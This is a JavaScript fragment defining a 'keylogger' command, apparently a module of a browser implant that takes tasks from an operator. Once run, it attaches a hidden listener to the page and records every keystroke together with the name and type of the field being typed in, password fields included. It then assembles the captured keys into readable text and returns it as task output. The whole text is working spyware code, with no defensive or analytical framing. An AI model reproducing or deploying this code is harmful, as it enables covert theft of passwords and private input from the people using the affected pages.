COMMANDS['keylogger'] = async function(task) {
    var params = parseParams(task);
    var duration = (params && params.duration) ? parseInt(params.duration) : 60;

    var entries = [];
    var currentField = '';

    function handler(e) {
        var tag = e.target.tagName || '';
        var type = e.target.type || '';
        var name = e.target.name || e.target.id || '';
        var field = tag + (type ? '[' + type + ']' : '') + (name ? '#' + name : '');

        // Log field changes
        if (field !== currentField) {
            currentField = field;
            entries.push({
                ts: new Date().toISOString(),
                event: 'focus',
                field: field
            });
        }

        var keyVal = '';
        if (e.key.length === 1) {
            keyVal = e.key;
        } else {
            keyVal = '[' + e.key + ']';
        }

        // Note modifiers
        var mods = '';
        if (e.ctrlKey) mods += 'Ctrl+';
        if (e.altKey) mods += 'Alt+';
        if (e.metaKey) mods += 'Meta+';
        if (mods && e.key.length > 1) keyVal = mods + keyVal;

        entries.push({
            ts: new Date().toISOString(),
            key: keyVal
        });
    }

    document.addEventListener('keydown', handler, true);

    // Register as background task with cancel support
    var cancelled = false;
    var timer;
    registerBackgroundTask(task.id, 'keylogger', function() {
        cancelled = true;
        if (timer) clearTimeout(timer);
        document.removeEventListener('keydown', handler, true);
    });

    await new Promise(function(resolve) {
        timer = setTimeout(resolve, duration * 1000);
        // If cancelled, the cancel callback clears the timer and we resolve via the cancel path
        var checkCancel = setInterval(function() {
            if (cancelled) {
                clearInterval(checkCancel);
                resolve();
            }
        }, 200);
    });

    if (!cancelled) {
        document.removeEventListener('keydown', handler, true);
    }
    unregisterBackgroundTask(task.id);

    // Format output
    var output = {
        duration: duration + 's',
        cancelled: cancelled,
        totalKeystrokes: entries.filter(function(e) { return e.key; }).length,
        captureStart: entries.length > 0 ? entries[0].ts : null,
        captureEnd: entries.length > 0 ? entries[entries.length - 1].ts : null,
        entries: entries
    };

    // Also build a readable text stream
    var readable = '';
    for (var i = 0; i < entries.length; i++) {
        if (entries[i].event === 'focus') {
            readable += '\n[' + entries[i].field + '] ';
        } else if (entries[i].key) {
            if (entries[i].key === '[Enter]') {
                readable += '\u23ce\n';
            } else if (entries[i].key === '[Backspace]') {
                readable += '\u232b';
            } else if (entries[i].key === '[Tab]') {
                readable += '\u21e5';
            } else if (entries[i].key === '[Space]' || entries[i].key === ' ') {
                readable += ' ';
            } else if (entries[i].key.length === 1) {
                readable += entries[i].key;
            } else {
                readable += entries[i].key;
            }
        }
    }
    output.readable = readable.trim();

    return JSON.stringify(output, null, 2);
};
